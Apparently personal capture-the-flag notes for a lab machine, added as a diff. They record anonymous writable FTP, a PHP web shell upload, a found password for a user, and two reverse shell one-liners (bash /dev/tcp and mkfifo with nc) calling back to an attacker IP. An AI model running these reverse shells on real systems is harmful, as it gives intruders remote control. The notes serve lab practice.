@@ -1,0 +1,36 @@
+10.10.124.187
+
+ftp
+ ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
+| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
+|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+http
+ssh
+
+possible username? : Maya
+
+ftp allows file upload
+
+ftp files can be accessed on http server
+
+php shell gives init shell
+
+and first flag found in /
+in '/incidents' dir is a file
+wich contains a password:
+c4ntg3t3n0ughsp1c3
+
+for USER LENNIE
+
+this shell doesnt work
+
+bash -i >& /dev/tcp/10.11.62.2/9999 0>&1
+
+but after reading a write up, this:
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
+
+causes a root shell
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.62.2 9999 >/tmp/f
